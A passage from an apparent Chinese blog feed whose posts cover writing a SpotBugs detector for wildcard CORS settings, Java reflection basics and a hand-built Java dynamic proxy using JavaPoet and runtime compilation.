handle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">assert</span> invoke != <span class="keyword">null</span> &amp;&amp; cpg != <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 可以通过一下方法获取InvokeMatcherBuilder的class、method、Signature</span></span><br><span class="line">        <span class="comment">// System.out.println(invoke.getClassName(cpg));</span></span><br><span class="line">        <span class="comment">// System.out.println(invoke.getMethodName(cpg));</span></span><br><span class="line">        <span class="comment">// System.out.println(invoke.getSignature(cpg));</span></span><br><span class="line">        <span class="keyword">if</span> (CORS_REGISTRY_ALLOWED_ORIGINS_METHOD.matches(invoke, cpg)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> InjectionPoint(<span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">0</span> &#125;, PERMISSIVE_CORS);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> InjectionPoint.NONE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回危险等级</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">getPriorityFromTaintFrame</span><span class="params">(TaintFrame fact, <span class="keyword">int</span> offset)</span> <span class="keyword">throws</span> DataflowAnalysisException </span>&#123;</span><br><span class="line">        <span class="comment">// Get the value of the Access-Control-Allow-Origin parameter (Second argument from setHeader(2nd,1rst))</span></span><br><span class="line">        Taint  originsTaint= fact.getStackValue(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (originsTaint.getConstantOrPotentialValue().contains(<span class="string">"*"</span>)) &#123; <span class="comment">//Ignore unknown/dynamic header name</span></span><br><span class="line">            <span class="keyword">return</span> Priorities.HIGH_PRIORITY;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> Priorities.IGNORE_PRIORITY;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里<code>getPriorityFromTaintFrame()</code>方法写的是有问题的，还是因为变长参数问题，导致<code>originsTaint.getConstantOrPotentialValue()</code>只能得到数组长度却不能拿到内容。</p><p>这里第二个难点就是获取函数原型，可以考虑是用javap：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -cp C:\Users\x5651\.m2\repository\org\springframework\spring-webmvc\5.1.6.RELEASE\spring-webmvc-5.1.6.RELEASE.jar -s org.springframework.web.servlet.config.annotation.CorsRegistration</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为帮我内推阿里的师傅告诉我以后可能要做源码审计的工作，先学习一下spotbugs和&lt;a href=&quot;https://find-sec-bugs.github.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;find-sec-bugs&lt;/a&gt;的扫描规则实现，并且尝试添加一个规则。&lt;/p&gt;&lt;h1 id=&quot;添加扫描规则——添加一个Detector&quot;&gt;&lt;a href=&quot;#添加扫描规则——添加一个Detector&quot; class=&quot;headerlink&quot; title=&quot;添加扫描规则——添加一个Detector&quot;&gt;&lt;/a&gt;添加扫描规则——添加一个Detector&lt;/h1&gt;&lt;p&gt;添加扫描规则主要是继承Detector，本文介绍以下几种主要的Detector：&lt;/p&gt;
    
    </summary>
    
      <category term="源码安全" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="源码安全" scheme="http://anemone.top/tags/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="http://anemone.top/tags/Java/"/>
    
      <category term="Spotbugs" scheme="http://anemone.top/tags/Spotbugs/"/>
    
  </entry>
  
  <entry>
    <title>java反射学习笔记</title>
    <link href="http://anemone.top/java-java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://anemone.top/java-java反射学习笔记/</id>
    <published>2019-03-14T06:44:26.000Z</published>
    <updated>2019-09-22T10:14:18.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="获取类对象"><a href="#获取类对象" class="headerlink" title="获取类对象"></a>获取类对象</h1><h2 id="动态加载一个类"><a href="#动态加载一个类" class="headerlink" title="动态加载一个类"></a>动态加载一个类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL[] urls = <span class="keyword">new</span> URL[] &#123;<span class="keyword">new</span> URL(<span class="string">"file:.\\out\\production\\java_reflect"</span>)&#125;;</span><br><span class="line">URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">Class clazz = classLoader.loadClass(<span class="string">"test.reflect.User"</span>);</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="寻找一个类"><a href="#寻找一个类" class="headerlink" title="寻找一个类"></a>寻找一个类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"test.reflect.User"</span>);</span><br></pre></td></tr></table></figure><h1 id="获取类中的构造方法"><a href="#获取类中的构造方法" class="headerlink" title="获取类中的构造方法"></a>获取类中的构造方法</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Constructor constructor1=clazz.getConstructor();</span><br><span class="line">User user1 = (User) constructor1.newInstance();</span><br><span class="line"></span><br><span class="line">Constructor constructor2=clazz.getConstructor(String.class, String.class);</span><br><span class="line">User user2 = (User) constructor2.newInstance(<span class="string">"lili"</span>, <span class="string">"123456"</span>);</span><br></pre></td></tr></table></figure><h1 id="获取类中属性"><a href="#获取类中属性" class="headerlink" title="获取类中属性"></a>获取类中属性</h1><h2 id="获取类中公有属性"><a href="#获取类中公有属性" class="headerlink" title="获取类中公有属性"></a>获取类中公有属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Field usernameField=clazz.getField(<span class="string">"username"</span>);</span><br><span class="line">usernameField.get(user2);</span><br></pre></td></tr></table></figure><h2 id="获取类中私有属性"><a href="#获取类中私有属性" class="headerlink" title="获取类中私有属性"></a>获取类中私有属性</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Field passwordField=clazz.getDeclaredField(<span class="string">"password"</span>);</span><br><span class="line">passwordField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">passwordField.set(user2, <span class="string">"654321"</span>);</span><br></pre></td></tr></table></figure><h1 id="获取类中方法"><a href="#获取类中方法" class="headerlink" title="获取类中方法"></a>获取类中方法</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method getInfoMethod=clazz.getDeclaredMethod(<span class="string">"getInfo"</span>, <span class="keyword">int</span>.class);</span><br></pre></td></tr></table></figure><h2 id="调用方法"><a href="#调用方法" class="headerlink" title="调用方法"></a>调用方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getInfoMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">String ret= (String) getInfoMethod.invoke(user2, <span class="number">1</span>);</span><br><span class="line">System.out.println(ret);</span><br></pre></td></tr></table></figure><h2 id="调用静态方法"><a href="#调用静态方法" class="headerlink" title="调用静态方法"></a>调用静态方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Method staticMethod=clazz.getDeclaredMethod(<span class="string">"staticMethod"</span>);</span><br><span class="line">staticMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">staticMethod.invoke(<span class="keyword">null</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;获取类对象&quot;&gt;&lt;a href=&quot;#获取类对象&quot; class=&quot;headerlink&quot; title=&quot;获取类对象&quot;&gt;&lt;/a&gt;获取类对象&lt;/h1&gt;&lt;h2 id=&quot;动态加载一个类&quot;&gt;&lt;a href=&quot;#动态加载一个类&quot; class=&quot;headerlink&quot; title=&quot;动态加载一个类&quot;&gt;&lt;/a&gt;动态加载一个类&lt;/h2&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;URL[] urls = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; URL[] &amp;#123;&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; URL(&lt;span class=&quot;string&quot;&gt;&quot;file:.\\out\\production\\java_reflect&quot;&lt;/span&gt;)&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;URLClassLoader classLoader = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; URLClassLoader(urls);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Class clazz = classLoader.loadClass(&lt;span class=&quot;string&quot;&gt;&quot;test.reflect.User&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="java" scheme="http://anemone.top/categories/java/"/>
    
    
      <category term="java" scheme="http://anemone.top/tags/java/"/>
    
      <category term="反射" scheme="http://anemone.top/tags/%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>java动态代理学习笔记</title>
    <link href="http://anemone.top/java-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://anemone.top/java-java动态代理学习笔记/</id>
    <published>2019-03-14T06:21:12.000Z</published>
    <updated>2019-09-22T10:14:18.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>java动态代理机制可以实现使用一个抽象的中介类对任意类的任意方法进行进行代理，大致原理是运行时生成一个代理类，代理类再调用委托对象。</p><h2 id="创建委托对象的接口"><a href="#创建委托对象的接口" class="headerlink" title="创建委托对象的接口"></a>创建委托对象的接口</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Sell</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="创建接口的实现"><a href="#创建接口的实现" class="headerlink" title="创建接口的实现"></a>创建接口的实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SellImpl</span> <span class="keyword">implements</span> <span class="title">Sell</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"In sell method."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"In add method."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实现中介类"><a href="#实现中介类" class="headerlink" title="实现中介类"></a>实现中介类</h2><p>中介类实现java.lang.reflect.InvocationHandler接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 委托类对象</span></span><br><span class="line">    <span class="keyword">private</span> Object object;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DynamicProxy</span><span class="params">(Object object)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.object=object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Before"</span>);</span><br><span class="line">        Object result = method.invoke(object, args);</span><br><span class="line">        System.out.println(<span class="string">"After"</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用户调用"><a href="#用户调用" class="headerlink" title="用户调用"></a>用户调用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建中介类实例</span></span><br><span class="line">        MyInvocationHandler inter = <span class="keyword">new</span> MyInvocationHandler(<span class="keyword">new</span> SellImpl());</span><br><span class="line">        <span class="comment">//加上这句将会产生一个$Proxy0.class文件，这个文件即为动态生成的代理类文件</span></span><br><span class="line">        System.getProperties().put(<span class="string">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span>,<span class="string">"true"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取代理类实例sell</span></span><br><span class="line">        Sell sell = (Sell)(Proxy.newProxyInstance(Sell.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123;Sell.class&#125;, inter));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过代理类对象调用代理类方法，实际上会转到invoke方法调用</span></span><br><span class="line">        sell.sell();</span><br><span class="line">        sell.add();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><ol><li>动态生成代理类，并且动态编译，再通过反射创建对象并加载到内存中：</li></ol><pre class="mermaid">graph LR   proxy[Proxy.newProxyInstance] -- JavaPoet --> java[C$Proxy0.java]   java -- Compile --> clazz[C$Proxy0.class]   clazz -- reflect --> sell[C$Proxy0]</pre><ol><li>在调用时，C$Proxy0代理InvocationHandler，InvocationHander代理subject。</li></ol><h2 id="生成代理类源码"><a href="#生成代理类源码" class="headerlink" title="生成代理类源码"></a>生成代理类源码</h2><p>newProxyInstance就是将中介类生成代理类源代码的方法，生成的代理类如下，可以看到其包含一个InvocationHander类，实现subject的接口，使用反射调用InvocationHander：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Override;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Proxy0</span> <span class="keyword">implements</span> <span class="title">Sell</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> InvocationHandler handler;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Proxy0</span><span class="params">(InvocationHandler handler)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.handler=handler;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    Method method = MyImpl.Sell.class.getMethod(<span class="string">"add"</span>);</span><br><span class="line">    <span class="keyword">this</span>.handler.invoke(<span class="keyword">this</span>, method, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">    Method method = MyImpl.Sell.class.getMethod(<span class="string">"sell"</span>);</span><br><span class="line">    <span class="keyword">this</span>.handler.invoke(<span class="keyword">this</span>, method, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以使用<a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fsquare%2Fjavapoet" target="_blank" rel="noopener">JavaPoet</a>实现，代码来自<a href="https://juejin.im/post/5a99048a6fb9a028d5668e62" target="_blank" rel="noopener">10分钟看懂动态代理设计模式</a>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.squareup.javapoet.FieldSpec;</span><br><span class="line"><span class="keyword">import</span> com.squareup.javapoet.JavaFile;</span><br><span class="line"><span class="keyword">import</span> com.squareup.javapoet.MethodSpec;</span><br><span class="line"><span class="keyword">import</span> com.squareup.javapoet.TypeSpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> javax.lang.model.element.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Proxy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(Class subject,InvocationHandler handler)</span> <span class="keyword">throws</span> IOException,</span></span><br><span class="line"><span class="function">            ClassNotFoundException,</span></span><br><span class="line"><span class="function">            NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;</span><br><span class="line">        <span class="comment">// 生成proxy.java</span></span><br><span class="line">        TypeSpec.Builder typeSpecBuilder = TypeSpec.classBuilder(<span class="string">"Proxy0"</span>)</span><br><span class="line">                .addSuperinterface(subject);</span><br><span class="line"></span><br><span class="line">        FieldSpec fieldSpec = FieldSpec.builder(InvocationHandler.class, <span class="string">"handler"</span>, Modifier.PRIVATE).build();</span><br><span class="line">        typeSpecBuilder.addField(fieldSpec);</span><br><span class="line"></span><br><span class="line">        MethodSpec constructorMethodSpec = MethodSpec.constructorBuilder()</span><br><span class="line">                .addModifiers(Modifier.PUBLIC)</span><br><span class="line">                .addParameter(InvocationHandler.class, <span class="string">"handler"</span>)</span><br><span class="line">                .addStatement(<span class="string">"this.handler=handler"</span>)</span><br><span class="line">                .build();</span><br><span class="line">        typeSpecBuilder.addMethod(constructorMethodSpec);</span><br><span class="line"></span><br><span class="line">        Method[] methods = subject.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">            MethodSpec methodSpec = MethodSpec.methodBuilder(method.getName())</span><br><span class="line">                    .addModifiers(Modifier.PUBLIC)</span><br><span class="line">                    .addAnnotation(Override.class)</span><br><span class="line">                    .returns(method.getReturnType())</span><br><span class="line">                    .addCode(<span class="string">"try &#123;\n"</span>)</span><br><span class="line">                    .addStatement(<span class="string">"\t$T method = "</span> + subject.getName() + <span class="string">".class.getMethod(\""</span> + method.getName() + <span class="string">"\")"</span>,</span><br><span class="line">                            Method.class)</span><br><span class="line">                    <span class="comment">// 为了简单起见，这里参数直接写死为空</span></span><br><span class="line">                    .addStatement(<span class="string">"\tthis.handler.invoke(this, method, null)"</span>)</span><br><span class="line">                    .addCode(<span class="string">"&#125; catch(Exception e) &#123;\n"</span>)</span><br><span class="line">                    .addCode(<span class="string">"\te.printStackTrace();\n"</span>)</span><br><span class="line">                    .addCode(<span class="string">"&#125;\n"</span>)</span><br><span class="line">                    .build();</span><br><span class="line">            typeSpecBuilder.addMethod(methodSpec);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        JavaFile javaFile = JavaFile.builder(<span class="string">"MyImpl"</span>, typeSpecBuilder.build()).build();</span><br><span class="line">        <span class="comment">// 为了看的更清楚，我将源码文件生成到桌面</span></span><br><span class="line">        String srcPath=<span class="string">"./MyProxy"</span>;</span><br><span class="line">        javaFile.writeTo(<span class="keyword">new</span> File(srcPath));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 编译源代码</span></span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载进内存并反射创建对象</span></span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编译Proxy0的源代码"><a href="#编译Proxy0的源代码" class="headerlink" title="编译Proxy0的源代码"></a>编译Proxy0的源代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaCompiler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">compile</span><span class="params">(File javaFile)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        javax.tools.JavaCompiler javaCompiler = ToolProvider.getSystemJavaCompiler();</span><br><span class="line">        StandardJavaFileManager fileManager = javaCompiler.getStandardFileManager(<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">        Iterable iterable = fileManager.getJavaFileObjects(javaFile);</span><br><span class="line">        javax.tools.JavaCompiler.CompilationTask task = javaCompiler.getTask(<span class="keyword">null</span>, fileManager, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, iterable);</span><br><span class="line">        task.call();</span><br><span class="line">        fileManager.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Proxy.newProxyInstance()中调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JavaCompiler.compile(<span class="keyword">new</span> File(srcPath+<span class="string">"/MyImpl/Proxy0.java"</span>));</span><br></pre></td></tr></table></figure><h2 id="加载进内存并创建对象"><a href="#加载进内存并创建对象" class="headerlink" title="加载进内存并创建对象"></a>加载进内存并创建对象</h2><p>使用URLClassLoader加载.class文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">File filpath=<span class="keyword">new</span> File(<span class="string">""</span>);</span><br><span class="line">URL[] urls = <span class="keyword">new</span> URL[] &#123;<span class="keyword">new</span> URL(<span class="string">"file:"</span>+filpath.getAbsoluteFile()+<span class="string">"\\MyProxy\\"</span>)&#125;;</span><br><span class="line">URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(urls);</span><br><span class="line">Class clazz = classLoader.loadClass(<span class="string">"MyImpl.Proxy0"</span>);</span><br><span class="line">Constructor constructor = clazz.getConstructor(InvocationHandler.class);</span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>); <span class="comment">//不懂 为什么已经是public的方法还需要setAccessible</span></span><br><span class="line">Object obj = constructor.newInstance(handler);</span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>可以像系统内置的那样设置动态代理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sell sell = (Sell)Proxy.newProxyInstance(Sell.class, <span class="keyword">new</span> MyInvocationHandler(<span class="keyword">new</span> SellImpl()));</span><br></pre></td></tr></table></figure><h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ul><li>10分钟看懂动态代理设计模式，<a href="https://juejin.im/post/5a99048a6fb9a028d5668e62" target="_blank" rel="noopener">https://juejin.im/post/5a99048a6fb9a028d5668e62</a></li><li>Java动态代理，<a href="https://juejin.im/post/5ad3e6b36fb9a028ba1fee6a" target="_blank" rel="noopener">https://juejin.im/post/5ad3e6b36fb9a028ba1fee6a</a></li></ul>]]></content>
    
    <summary type="html">
    
